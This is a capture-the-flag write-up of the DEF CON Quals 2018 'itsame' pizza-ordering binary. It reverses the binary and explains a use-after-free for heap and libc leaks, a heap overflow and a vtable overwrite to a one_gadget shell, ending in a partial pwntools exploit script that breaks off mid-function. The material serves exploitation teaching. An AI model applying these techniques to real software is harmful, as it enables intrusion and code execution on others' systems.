# defcon quals 2018 itsame

This writeup is based off of: https://raywang.tech/2018/05/14/DEF-CON-Quals-2018-It-s-a-Me/

### Reversing

Let's take a look at the binary:
```
$	file mario 
mario: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=31b2a56f3cbc9221927855915042e9b1b6d97675, stripped
$	pwn checksec mario 
[*] '/Hackery/dcquals18/itsame/mario'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$	./mario 
Wellcom my friende!! It's-a me, Mario! Ready for pizza italiana vera?
------------------- MAIN MENU -------------------
(N)ew customer
(L)ogin as customer
(E)xit
Choice: N
Hello, what's your name? guy
>> Welcome guy
------------------- USER MENU -------------------
(O)rder more pizzas
(C)ook all pizzas
(A)dmire cooked pizzas
(L)eave
Choice: L
see you guy
```

So we can see it is a `64` bit binary with RELRO, a Stack Canary, Non executable stack, and PIE. When we run the binary, we see that we are given two different menus. One to select what customer we are, and once we selected a customer one to order pizzas.

Starting off in the main function, we see that other than running `setbuf` and `puts`, it runs a single function. When we look at it, we see that it is essentially a menu which runs the functions that we would expect it to (login, new customer, and exit). However we also see that there is another function we won't told about:

```
      else
      {
        if ( menuChoice != 'W' )
        {
LABEL_15:
          printf("mmm '%c', what's that? I donn't understande, Mario confused\n", (unsigned int)menuChoice);
          goto LABEL_16;
        }
        if ( infoLeakCondition )
          infoLeak();
        else
          puts("not upset at the moment");
      }
```

So something about Mario being upset, gives us an extra menu option that runs this function:

```
int infoLeak()
{
  printf("your friend %s ordered a pizza with %s and I should stay calm?\n", *infoLeakCondition, &needle);
  printf(
    "'That must be a mistake', you may say. But I asked, and this is what he had to say: %s\n",
    infoLeakCondition[4]);
  return puts("niente scuse");
}
```

the `infoLeakCondition[4]` is the same as `infoLeakCondition + 32`. This will come factor in later. When we create a new user, we can see that it creates a new "customer" structure `0x48` bytes big:

```
  newUserPtr = (_QWORD *)operator new(0x48uLL);
```

We can also see that the address of the custmer structure is saved in the bss variable `savedUser` (address `0x20c5b8`):
```
  savedUser = newUserPtrCpy;
```

When we take a look at the customer structure after the  `newCustomer` function, we see that it has a char pointer to the name of the customer, and an integer equal to `0x0`. PIE base is `0x0000555555554000`, so the address of `savedUser` is `0x0000555555554000 + 0x20c5b8 = 0x5555557605b8`

```
gef➤  x/g 0x5555557605b8
0x5555557605b8:	0x0000555555772c20
gef➤  x/9g 0x0000555555772c20
0x555555772c20:	0x0000555555772c70	0x0000000000000000
0x555555772c30:	0x0000000000000000	0x0000000000000000
0x555555772c40:	0x0000000000000000	0x0000000000000000
0x555555772c50:	0x0000000000000000	0x0000000000000000
0x555555772c60:	0x0000000000000001
gef➤  x/s 0x0000555555772c70
0x555555772c70:	"guyinatuxedo"
```

With a quick glance, the login function appears to just check if the user exists, and if it does it drops us into the secondary menu. When we select a user (either as a new or returning customer), there is a new menu that is presented to us with the options to order, cook, admire, and leave. When we take a look at the function that is responsible for ordering pizzas (begins at `0x269a`), we see a couple of things. We can't have more than 100 (0x64) pizzas, each with no more than 20 ingredients:

```
  if ( (unsigned int)pizzaQnty <= 0x64 )
  {
```

```
      if ( (unsigned int)ingredientsQnty > 0x14 )
      {
```

However later on, we see that it checks our input for a specific string (input is stored in `haystack`):

```
          if ( strstr(&haystack, &needle) )
          {
            *(_BYTE *)(a1 + 65) = 1;
            puts("You serious? PINEAPPLE? Tu sei un pazzo, get out. https://youtu.be/J6dFEtb06nw?t=27");
            v1 = 0;
            goto LABEL_16;
          }
```

when we set a breakpoint for the `strstr` call and see what it compares, we see this:

```
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555567bf                  lea    rax, [rbp-0x30]
   0x5555555567c3                  lea    rsi, [rip+0x4cdb]        # 0x55555555b4a5
   0x5555555567ca                  mov    rdi, rax
 → 0x5555555567cd                  call   0x555555555538
   ↳  0x555555555538                  jmp    QWORD PTR [rip+0x20aa02]        # 0x55555575ff40
      0x55555555553e                  xchg   ax, ax
      0x555555555540                  jmp    QWORD PTR [rip+0x20aa02]        # 0x55555575ff48
      0x555555555546                  xchg   ax, ax
      0x555555555548                  jmp    QWORD PTR [rip+0x20aa02]        # 0x55555575ff50
      0x55555555554e                  xchg   ax, ax
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
0x555555555538 (
   $rdi = 0x00007fffffffddb0 → "15935728",
   $rsi = 0x000055555555b4a5 →  lock lahf,
   $rdx = 0x0000000000000007,
   $rcx = 0x0000000000000db0
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "mario", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555567cd → call 0x555555555538
[#1] 0x55555555606a → jmp 0x555555556142
[#2] 0x555555555f0a → jmp 0x555555555e6e
[#3] 0x555555555dec → lea rdi, [rip+0x59d3]        # 0x55555555b7c6
[#4] 0x7ffff7495830 → __libc_start_main(main=0x555555555d87, argc=0x1, argv=0x7fffffffdf28, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdf18)
[#5] 0x555555555619 → hlt 
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/g 0x000055555555b4a5
0x55555555b4a5:	0x000000008d8d9ff0
```

So we can see that it is comparing our string against the value `0x8d8d9ff0`. When we google the string `\xf0\x9f\x8d\x8d` we find https://apps.timwhitlock.info/emoji/tables/unicode which tells us that `0x8d8d9ff0` is the value for a pineapple emoji. So it's just checking to make sure that we don't have a pineapple emoji be apart of one of our ingredients. 

After we have this function run, we can see that our customer structure gets a vector which takes us the space between `0x8-0x20`:

```
gef➤  x/9x 0x555555772c20
0x555555772c20:	0x0000555555772c70	0x0000555555772ce0
0x555555772c30:	0x0000555555772cf8	0x0000555555772cf8
0x555555772c40:	0x0000000000000000	0x0000000000000000
0x555555772c50:	0x0000000000000000	0x0000000000000000
0x555555772c60:	0x0000000000000001
gef➤  x/10g 0x0000555555772ce0
0x555555772ce0:	0x0000555555772d00	0x0000555555772d20
0x555555772cf0:	0x0000555555772d20	0x0000000000000031
0x555555772d00:	0x0000555555772d10	0x0000000000000008
0x555555772d10:	0x696e6f7265706570	0x0000000000000000
0x555555772d20:	0x0000000000000000	0x00000000000202e1
gef➤  x/g 0x0000555555772d00
0x555555772d00:	0x0000555555772d10
gef➤  x/s 0x0000555555772d10
0x555555772d10:	"peperoni"
```

Next up in the function that cooks pizzas `cookPizza` (starts at `0x28fe`) which deals with pizzas we have ordered, we see that once again it checks to see if there is a pineapple emoji in the final pizza name (which is made by combining the pizza ingredients):

```
      if ( strstr(pizza, &needle) )
      {
        pineapple = 1;
      }
```

and if there is a pineapple emoji in the final pizza name, we see that this code executes which will assign `infoleakCondition` a nonzero value, which will allow us to run that extra menu option:

```
      if ( pineapple )
      {
        printf("HOW IS IT POSSIBLE??? %s here?? How could this order get here? this pizza is criminal.\n", &needle);
        printf("And this is the only thing you could say about your order: %s\n", *(_QWORD *)(userStruct + 32));
        puts("are you serious?");
        infoLeakCondition = (_QWORD *)userStruct;
      }
```

even though there is the filter when we order pizzas, it is still possible to have a pineapple appear in the name. This is because the ingrediens are concatenated together, so we can input two seperate ingredients that when combined form a pineapple emoji:

```
      strcat(pizza, currentIngredient);
```

In addition to that, at the start of this function we are prompted for an explanation that is stored at a char pointer in our user structure at the offset `+32`:

```
  printf("Before I start cooking your pizzas, do you have anything to declare? Please explain: ");
  freadCall((__int64)explanation, 300);
  v1 = strlen(explanation);
  *(_QWORD *)(userStruct + 32) = malloc(v1 + 1);
  strcpy(*(char **)(userStruct + 32), explanation);
```

later on there is a code path where that same structure gets freed, yet the pointer remains:
```
    if ( totalPizzas >> 4 == (tomatoPizzas & 0xF) )
    {
      puts("Molto bene, all cooked!");
      if ( !(totalPizzas & 0xF) )
        free(*(void **)(userStruct + 32));
    }
```

To meet this condition, the lower four bits of `totalPizzas` must be equal to `tomatoPizzas`. Right above the pineapple check, we see that there is another check, however this time it is for the tomato emoji `0x858d9ff0` instead of the pineapple emoji. 

```
      if ( strstr(pizza, &tomato) )
        isTomoato = 1;
```

Using gdb and testing with different inputs, we see that `tomatoPizzas` is equal to the total number of pizzas with the tomato emoji in it's name, and `totalPizzas` is equal to the total number of pizzas. We could do this by having every pizza name have the tomato emoji in it, however then we wouldn't hit the pineapple condition which let's mario get mad and grant us more code paths. However the counters are only four bits (this is evident with the fact that whenever they are referenced they are either anded by 0xf which grabs the lowest four bits or shifted to the right by four bytes, which in this case leaves us with the lowest four bits). As a result we can add 16 pineapple pizzas, which would cause `0xf` to overflow to `0x1`, and have one tomoato pizzas, that way it would compare `0x1` to `0x1` and we would pass the check. Also we see that after this function is ran, the customer data structure becomes full, and has the folling values in it:

```
0x0:  char ptr to customer name
0x8:  vector to pizza ingredients
0x20: char ptr to cooking pizza instructions
0x28: vector to pizza ovject
0x40: 8 byte int, represents if mario is angry or not
```

When we cook a pineapple pizza, we are given new options when we return to the secondary menu:
```
------------------- USER MENU -------------------
Mario upset. These are your choices:
(P)lease, Mario, hear me out. Let me explain
(Y)ou are right, putting pineapple on pizza is unforgivable. I'll go away and never come back.
Choice: 
```

When we input the option `P`, we hit a code path that we weren't able to before. This code path also has a heap overflow bug in it (this starts at `0x20d6`):

```
lea     rax, savedUser
mov     rax, [rax]
mov     rax, [rax+20h]
mov     esi, 12Ch
mov     rdi, rax
call    freadCall
```

Here it is taking the char pointer which we used to store the explanation when we cooked our pizza (stored at offset +32 which is `+0x20`), and scanning in `0x12c` (`300`) bytes worth of checking. Thing is, since that space can be smaller than `300` bytes this is a heap overflow.

In addition to that, in the secondary menu (the one after we pick a user) there is another function where we admire a pizza. This function is interesting since it will execute a vtable address, which is stored in the pizza object in the heap (it's supposed to print out something about the pizza). We can see the vtable call here in ida at (`0x3039`):

```
    (**v9)(v9, &s);
```

and the assembly code verifies what IDA says. It just takes the vtable pointer from the heap object, dereferences it twice, then runs it.

```
mov     rax, [rbp+var_1918]
mov     rax, [rax]
mov     rax, [rax]
lea     rcx, [rbp+s]
mov     rdx, [rbp+var_1918]
mov     rsi, rcx
mov     rdi, rdx
call    rax
```


### Exploitation - Infoleak

So here is the plan. Use the Use After Free bug to get a heap and libc infoleak. Then do a bit of grooming to setup a heap overflow where we overwrite the vtable address which is executed to be a pointer to a one_gadget (using both the heap and libc infoleaks).

Since Mario is now angry, we can exit back to the main function, and issue the menu option `W`. This will print the address that has been freed. If the chunk that has been freed is a fast bin (will need to be greater than `0x80` bytes), it will end up in the unsorted bin. The unsorted bin is a doubly-linked list of freed chunks, with the forward and back pointers will point to the unsorted bin list, which depending on how many entries there are in the unsorted bin will either be a heap or libc address. When we set a breakpoint for that printf call where we get the infoleak, we can see the libc pointers:

There we can see that for the addresses for the forward and back pointers, one is a heap address and the other is a heap address:

```
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5585e92c5474                  mov    rsi, rax
   0x5585e92c5477                  lea    rdi, [rip+0x56e2]        # 0x5585e92cab60
   0x5585e92c547e                  mov    eax, 0x0
 → 0x5585e92c5483                  call   0x5585e92c44a8
   ↳  0x5585e92c44a8                  jmp    QWORD PTR [rip+0x20a9da]        # 0x5585e94cee88
      0x5585e92c44ae                  xchg   ax, ax
      0x5585e92c44b0                  jmp    QWORD PTR [rip+0x20a9da]        # 0x5585e94cee90
      0x5585e92c44b6                  xchg   ax, ax
      0x5585e92c44b8                  jmp    QWORD PTR [rip+0x20a9da]        # 0x5585e94cee98
      0x5585e92c44be                  xchg   ax, ax
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 
arguments (guessed) ────
0x5585e92c44a8 (
   $rdi = 0x00005585e92cab60 → "'That must be a mistake', you may say. But I asked[...]",
   $rsi = 0x00005585e9588130 → 0x00005585e95890a0 → 0x0000000000000000,
   $rdx = 0x00007f3b0636f780 → 0x0000000000000000
)
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "mario", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5585e92c5483 → call 0x5585e92c44a8
[#1] 0x7ffcbeade960 → sub cl, 0xad
[#2] 0x5585e92c4ec8 → jmp 0x5585e92c4ef2
────────────────────────────────────────────────────────────────────────────────
gef➤  x/10g 0x00005585e9588130
0x5585e9588130:	0x5585e95890a0	0x7f3b0636db78
0x5585e9588140:	0x3030303030303030	0x3030303030303030
0x5585e9588150:	0x3030303030303030	0x3030303030303030
0x5585e9588160:	0x3030303030303030	0x3030303030303030
0x5585e9588170:	0x3030303030303030	0x3030303030303030
gef➤  vmmap
Start              End                Offset             Perm Path
.	.	.

0x00005585e9576000 0x00005585e95a8000 0x0000000000000000 rw- [heap]

.	.	.

0x00007f3b05fa9000 0x00007f3b06169000 0x0000000000000000 r-x /home/guyinatuxedo/Desktop/mario/libc.so.6
0x00007f3b06169000 0x00007f3b06369000 0x00000000001c0000 --- /home/guyinatuxedo/Desktop/mario/libc.so.6
0x00007f3b06369000 0x00007f3b0636d000 0x00000000001c0000 r-- /home/guyinatuxedo/Desktop/mario/libc.so.6
0x00007f3b0636d000 0x00007f3b0636f000 0x00000000001c4000 rw- /home/guyinatuxedo/Desktop/mario/libc.so.6

.	.	.
```

There we can see that for the addresses for the forward and back pointers, one is a heap address `0x5585e95890a0` and the other is a libc address `0x7f3b0636db78` (the one which will be leaked is the heap address). The reason for the heap infoleak is that there is another freed entry in the unsorted bin due to a vector resizing. However with a bit of heap grooming we can also leak a libc address using this method, by simply creating a new customer, ordering one tomato pizza, and running the function that gives us an infoleak. When we do that, we see that the forward and back pointers both point to main_arena, thus giving us a libc infoleak:

```
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5585e92c5474                  mov    rsi, rax
   0x5585e92c5477                  lea    rdi, [rip+0x56e2]        # 0x5585e92cab60
   0x5585e92c547e                  mov    eax, 0x0
 → 0x5585e92c5483                  call   0x5585e92c44a8
   ↳  0x5585e92c44a8                  jmp    QWORD PTR [rip+0x20a9da]        # 0x5585e94cee88
      0x5585e92c44ae                  xchg   ax, ax
      0x5585e92c44b0                  jmp    QWORD PTR [rip+0x20a9da]        # 0x5585e94cee90
      0x5585e92c44b6                  xchg   ax, ax
      0x5585e92c44b8                  jmp    QWORD PTR [rip+0x20a9da]        # 0x5585e94cee98
      0x5585e92c44be                  xchg   ax, ax
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
0x5585e92c44a8 (
   $rdi = 0x00005585e92cab60 → "'That must be a mistake', you may say. But I asked[...]",
   $rsi = 0x00005585e9588130 → 0x00007f3b0636db78 → 0x00005585e9589720 → 0x0000000000000000,
   $rdx = 0x00007f3b0636f780 → 0x0000000000000000
)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "mario", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5585e92c5483 → call 0x5585e92c44a8
[#1] 0x7ffcbeade960 → sub cl, 0xad
[#2] 0x5585e92c4ec8 → jmp 0x5585e92c4ef2
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/10g 0x00005585e9588130
0x5585e9588130:	0x7f3b0636db78	0x7f3b0636db78
0x5585e9588140:	0x3131313131313131	0x3131313131313131
0x5585e9588150:	0x3131313131313131	0x3131313131313131
0x5585e9588160:	0x3131313131313131	0x3131313131313131
0x5585e9588170:	0x3131313131313131	0x3131313131313131
```

So with that, we can get both a libc and heap infoleak.

### exploit - vtable overwrite

So we are going to use the heap overflow to overwrite a vtable function with a oneshot gadget. Before that happens, let's take a look where exactly the pointer we are overwriting is. I set a breakpoint for `0x3018`:

```
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55555555700a                  add    BYTE PTR [rsi+0x0], bh
   0x555555557010                  mov    rdi, rax
   0x555555557013                  call   0x5555555554b0
 → 0x555555557018                  mov    rax, QWORD PTR [rbp-0x1918]
   0x55555555701f                  mov    rax, QWORD PTR [rax]
   0x555555557022                  mov    rax, QWORD PTR [rax]
   0x555555557025                  lea    rcx, [rbp-0x1910]
   0x55555555702c                  mov    rdx, QWORD PTR [rbp-0x1918]
   0x555555557033                  mov    rsi, rcx
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "mario", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555557018 → mov rax, QWORD PTR [rbp-0x1918]
[#1] 0x5555555560b6 → jmp 0x55555555614e
[#2] 0x555555555f0a → jmp 0x555555555e6e
[#3] 0x555555555dec → lea rdi, [rip+0x59d3]        # 0x55555555b7c6
[#4] 0x7ffff7495830 → __libc_start_main(main=0x555555555d87, argc=0x1, argv=0x7fffffffdf28, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdf18)
[#5] 0x555555555619 → hlt 
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/g $rbp-0x1918
0x7fffffffc4c8: 0x0000555555772ef0
gef➤  x/x 0x0000555555772ef0
0x555555772ef0: 0x000055555575fbe0
gef➤  x/x 0x000055555575fbe0
0x55555575fbe0: 0x0000555555555ce2
gef➤  x/3i 0x0000555555555ce2
   0x555555555ce2:  push   rbp
   0x555555555ce3:  mov    rbp,rsp
   0x555555555ce6:  sub    rsp,0x10
```

So we can see that it is a pointer, to a pointer, to a function that is executed. We can see that the second pointer `0x000055555575fbe0` is stored in the heap (so we can overwrite it):

```
gef➤  search-pattern 0x000055555575fbe0
[+] Searching '0x000055555575fbe0' in memory
[+] In '[heap]'(0x555555761000-0x555555793000), permission=rw-
  0x555555772ef0 - 0x555555772f10  →   "\xe0\xfb\x75\x55\x55\x55\x00\x00[...]" 
```

When we examine `savedUser` (address `0x0000555555554000 + 0x20c5b8 = 0x5555557605b8`), we see that there is a pointer to the address `0x0000555555772ef0` in it.

```
gef➤  x/g 0x5555557605b8
0x5555557605b8: 0x0000555555772c20
gef➤  x/9g 0x0000555555772c20
0x555555772c20: 0x0000555555772c70  0x0000555555772ce0
0x555555772c30: 0x0000555555772cf8  0x0000555555772cf8
0x555555772c40: 0x0000555555772d30  0x0000555555772f50
0x555555772c50: 0x0000555555772f58  0x0000555555772f58
gef➤  x/g 0x0000555555772f50
0x555555772f50: 0x0000555555772ef0
```

We will place the oneshot gadget on the heap somewhere (we will know it's address due to the heap address infoleak), and overwrite the second pointer to point to the oneshot gadget. That brings up the question on how do we groom the heap in order to get that pointer in range of our overwrite. Thing is, malloc will use recently freed memory in new allocations in order to speed up it's runtime. With the libc and heap infoleaks, we would of already freed two chunks of memory, so that is probably going to be reused. To see the state of the heap is after the infoleaks, I ran the exploit (what I have of it so far), created a new user, and checked to see what the heap was like. Keep in mind that the overflow has to come from the user with the pineapple, so we're concerned with where the second pointer for the vtable function for the second user is in relation to the explanation from the first:

So we can see here the two user instances, one for the user `guyinatuxedo` (which has had the pineapple anger mario) and the second user `15935728`

```
gef➤  x/9g 0x55b7b8a90c20
0x55b7b8a90c20: 0x000055b7b8a90c70  0x000055b7b8a91540
0x55b7b8a90c30: 0x000055b7b8a916d8  0x000055b7b8a91840
0x55b7b8a90c40: 0x000055b7b8a91130  0x000055b7b8a92440
0x55b7b8a90c50: 0x000055b7b8a924c8  0x000055b7b8a92540
0x55b7b8a90c60: 0x0000000000000001
gef➤  x/9g 0x55b7b8a90d30
0x55b7b8a90d30: 0x000055b7b8a920b0  0x000055b7b8a90c90
0x55b7b8a90d40: 0x000055b7b8a90ca8  0x000055b7b8a90ca8
0x55b7b8a90d50: 0x000055b7b8a91130  0x000055b7b8a92710
0x55b7b8a90d60: 0x000055b7b8a92718  0x000055b7b8a92718
0x55b7b8a90d70: 0x0000000000000001
gef➤  x/s 0x000055b7b8a90c70
0x55b7b8a90c70: "guyinatuxedo"
gef➤  x/s 0x000055b7b8a920b0
0x55b7b8a920b0: "15935728"
```

We can see that the freed chunk located at `0x000055b7b8a91130` has been reused for the second user. When we take a look at what is within our overflow range, we don't see the vtable object:

```
gef➤  telescope 0x000055b7b8a91130 40
0x000055b7b8a91130│+0x0000: 0x00007fa157743b78  →  0x000055b7b8a92720  →  0x0000000000000000
0x000055b7b8a91138│+0x0008: 0x00007fa157743b78  →  0x000055b7b8a92720  →  0x0000000000000000
0x000055b7b8a91140│+0x0010: "11111111111111111111111111111111111111111111111111[...]"
0x000055b7b8a91148│+0x0018: "11111111111111111111111111111111111111111111111111[...]"
0x000055b7b8a91150│+0x0020: "11111111111111111111111111111111111111111111111111[...]"
0x000055b7b8a91158│+0x0028: "11111111111111111111111111111111111111111111111111[...]"
0x000055b7b8a91160│+0x0030: "11111111111111111111111111111111111111111111111111[...]"
0x000055b7b8a91168│+0x0038: "11111111111111111111111111111111111111111111111111[...]"
0x000055b7b8a91170│+0x0040: "11111111111111111111111111111111111111111111111111[...]"
0x000055b7b8a91178│+0x0048: "11111111111111111111111111111111111111111111111111[...]"
0x000055b7b8a91180│+0x0050: "11111111111111111111111111111111111111111111111111[...]"
0x000055b7b8a91188│+0x0058: "11111111111111111111111111111111111111111111111111[...]"
0x000055b7b8a91190│+0x0060: "11111111111111111111111111111111111111111111111111[...]"
0x000055b7b8a91198│+0x0068: "11111111111111111111111111111111111111111111111111[...]"
0x000055b7b8a911a0│+0x0070: "11111111111111111111111111111111111111111111111111[...]"
0x000055b7b8a911a8│+0x0078: "11111111111111111111111111111111111111111111111111[...]"
0x000055b7b8a911b0│+0x0080: "11111111111111111111111111111111111111111111111111[...]"
0x000055b7b8a911b8│+0x0088: "11111111111111111111111111111111111111111111111111[...]"
0x000055b7b8a911c0│+0x0090: "11111111111111111111111111111111111111111111111111[...]"
0x000055b7b8a911c8│+0x0098: "111111111111111111111111111111111111111111111111"
0x000055b7b8a911d0│+0x00a0: "1111111111111111111111111111111111111111"
0x000055b7b8a911d8│+0x00a8: "11111111111111111111111111111111"
0x000055b7b8a911e0│+0x00b0: "111111111111111111111111"
0x000055b7b8a911e8│+0x00b8: "1111111111111111"
0x000055b7b8a911f0│+0x00c0: "11111111"
0x000055b7b8a911f8│+0x00c8: 0x000055b7b8a91300  →  0x0000000000000000
0x000055b7b8a91200│+0x00d0: 0x00000000000000e0
0x000055b7b8a91208│+0x00d8: 0x0000000000000040 ("@"?)
0x000055b7b8a91210│+0x00e0: 0x000055b7b897cbe0  →  0x000055b7b8772ce2  →   push rbp
0x000055b7b8a91218│+0x00e8: 0x000055b7b8a91250  →  0x0030308d8d9ff0e0
0x000055b7b8a91220│+0x00f0: 0x000055b7b8a90e80  →  0x000055b7b8a90ec0  →  0x0000000000000000
0x000055b7b8a91228│+0x00f8: 0x000055b7b8a90ec0  →  0x0000000000000000
0x000055b7b8a91230│+0x0100: 0x000055b7b8a90ec0  →  0x0000000000000000
0x000055b7b8a91238│+0x0108: 0x000055b7b8a90dc0  →  0x000055b7b8a90e70  →  0x0000000000000000
0x000055b7b8a91240│+0x0110: 0x000055b7b8a90e00  →  0x0000000000000000
0x000055b7b8a91248│+0x0118: 0x0000000000000021 ("!"?)
0x000055b7b8a91250│+0x0120: 0x0030308d8d9ff0e0
0x000055b7b8a91258│+0x0128: 0x00007fa157743b78  →  0x000055b7b8a92720  →  0x0000000000000000
0x000055b7b8a91260│+0x0130: 0x000055b7b8a91030  →  0x0000000000000000
0x000055b7b8a91268│+0x0138: 0x0000000000000021 ("!"?)
gef➤  x/g 0x000055b7b8a92710
0x55b7b8a92710: 0x000055b7b8a920f0
gef➤  x/g 0x000055b7b8a920f0
0x55b7b8a920f0: 0x000055b7b897cc00
gef➤  x/g 0x000055b7b897cc00
0x55b7b897cc00: 0x000055b7b8772cac
gef➤  x/3i 0x000055b7b8772cac
   0x55b7b8772cac:  push   rbp
   0x55b7b8772cad:  mov    rbp,rsp
   0x55b7b8772cb0:  sub    rsp,0x10
```

We can see here, that the vtable pointers are way away from the range that we can overflow (up to the offset `+0x12c`). Part of the issue might be that the explanation that we gave (all of the `1`s) is massive, and pushing it further down the heap. When we try to recook the pizzas of the second customer with a smaller explanation (explanation is `1111`) we see that the heap contents favors us:

```
gef➤  telescope 0x56377948c130 40
0x000056377948c130│+0x0000: 0x000056377948c1a0  →  0x000056377948c1b0  →  0x31313100858d9ff0
0x000056377948c138│+0x0008: 0x000056377948c1c0  →  "11111111A"
0x000056377948c140│+0x0010: 0x000056377948c1c0  →  "11111111A"
0x000056377948c148│+0x0018: 0x000056377948c170  →  0x000056377948c180  →  0x31313100858d9ff0
0x000056377948c150│+0x0020: 0x000056377948c190  →  "111111111"
0x000056377948c158│+0x0028: 0x000056377948c190  →  "111111111"
0x000056377948c160│+0x0030: "111111111"
0x000056377948c168│+0x0038: 0x0000000000000031 ("1"?)
0x000056377948c170│+0x0040: 0x000056377948c180  →  0x31313100858d9ff0
0x000056377948c178│+0x0048: 0x0000000000000004
0x000056377948c180│+0x0050: 0x31313100858d9ff0
0x000056377948c188│+0x0058: "11111111111111111"
0x000056377948c190│+0x0060: "111111111"
0x000056377948c198│+0x0068: 0x0000000000000031 ("1"?)
0x000056377948c1a0│+0x0070: 0x000056377948c1b0  →  0x31313100858d9ff0
0x000056377948c1a8│+0x0078: 0x0000000000000004
0x000056377948c1b0│+0x0080: 0x31313100858d9ff0
0x000056377948c1b8│+0x0088: "1111111111111111A"
0x000056377948c1c0│+0x0090: "11111111A"
0x000056377948c1c8│+0x0098: 0x0000000000000041 ("A"?)
0x000056377948c1d0│+0x00a0: 0x00005637785dfc00  →  0x00005637783d5cac  →   push rbp
0x000056377948c1d8│+0x00a8: 0x000056377948d8d0  →  0x00000000858d9ff0
0x000056377948c1e0│+0x00b0: "111111111111111111111111"
0x000056377948c1e8│+0x00b8: "1111111111111111"
0x000056377948c1f0│+0x00c0: "11111111"
0x000056377948c1f8│+0x00c8: 0x000056377948c300  →  0x0000000000000000
0x000056377948c200│+0x00d0: 0x0000000000000040 ("@"?)
0x000056377948c208│+0x00d8: 0x0000000000000041 ("A"?)
0x000056377948c210│+0x00e0: 0x00005637785dfbe0  →  0x00005637783d5ce2  →   push rbp
0x000056377948c218│+0x00e8: 0x000056377948c250  →  0x0030308d8d9ff0e0
0x000056377948c220│+0x00f0: 0x000056377948be80  →  0x000056377948bec0  →  0x0000000000000000
0x000056377948c228│+0x00f8: 0x000056377948bec0  →  0x0000000000000000
0x000056377948c230│+0x0100: 0x000056377948bec0  →  0x0000000000000000
0x000056377948c238│+0x0108: 0x000056377948bdc0  →  0x000056377948be70  →  0x0000000000000000
0x000056377948c240│+0x0110: 0x000056377948be00  →  0x0000000000000000
0x000056377948c248│+0x0118: 0x0000000000000021 ("!"?)
0x000056377948c250│+0x0120: 0x0030308d8d9ff0e0
0x000056377948c258│+0x0128: 0x00007fa24363fb78  →  0x000056377948d940  →  0x0000000000000000
0x000056377948c260│+0x0130: 0x000056377948c030  →  0x0000000000000000
0x000056377948c268│+0x0138: 0x0000000000000021 ("!"?)
```

So we can see at offset `0xa0` (`160` bytes away) is a pointer, to a vtable function address. This is totally within the range of our `300` byte overflow, and we can place the oneshot gadget at the start of overflow, and use the heap infoleak to calculate the address of where the oneshot gadget is (for this iteration, the heap infoleak is `0x56377948d0a0` and the onegadget location would be at `0x000056377948c130` so the offset is `0x000056377948c130 - 0x56377948d0a0 = -0xf70`).

With that, we can just send the oneshot gadget, followed by `152` (`0xa0 - 8 = 152`) bytes of data, followed by a pointer to the oneshot gadget which will overflow the vtable function pointer. At that point we can just admire the pizzas, which will trigger the oneshot gadget. Also to find the oneshot gadget, we can just use this tool https://github.com/david942j/one_gadget:

```
$ one_gadget libc.so.6 
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

### Eploit

I would like to say thanks to the person who made the writeup this is based off of. Putting it all together, we get this exploit:
```
# This exploit is based off of: https://raywang.tech/2018/05/14/DEF-CON-Quals-2018-It-s-a-Me/

from pwn import *

target = process('./mario', env = {"LD_PRELOAD": "./libc.so.6"})
gdb.attach(target, gdbscript = 'entry-break')

# These are just the string values for the tomato / pineapple emojus
pineapple = p32(0x8d8d9ff0)
tomato = p32(0x858d9ff0)

# Functions to deal with the IO with the code

def newCustomer(name):
    print target.recvuntil("Choice: ")
    target.sendline("N")
    print target.recvuntil("Hello, what's your name? ")
    target.sendline(name)

def orderPizzas(ingr):
    print target.recvuntil("Choice: ")
    target.sendline("O")
    qty = len(ingr)
    print target.recvuntil(">> how many pizzas? ")
    target.sendline(str(len(ingr)))
    for i in xrange(qty):
        pizzaQty = len(ingr[i])
        target.sendline(str(pizzaQty))
        for j in xrange(pizzaQty):
            target.sendline(ingr[i][j])
    
def cookPizzas(expl):
  print target.recvuntil("Choice: ")
  target.sendline("C")
  print target.recvuntil("Please explain: ")
  target.sendline(expl)

def leave():
  print target.recvuntil("Choice: ")
  target.sendline("L")

def admire():
  print target.recvuntil("Choice: ")
  target.sendline("A")


def login(name):
  print target.recvuntil("Choice: ")
  target.sendline("L")
  print target.recvuntil("your name? ")
  target.sendline(name)

def explainOverflow(payload):
  print target.recvuntil("Choice: ")
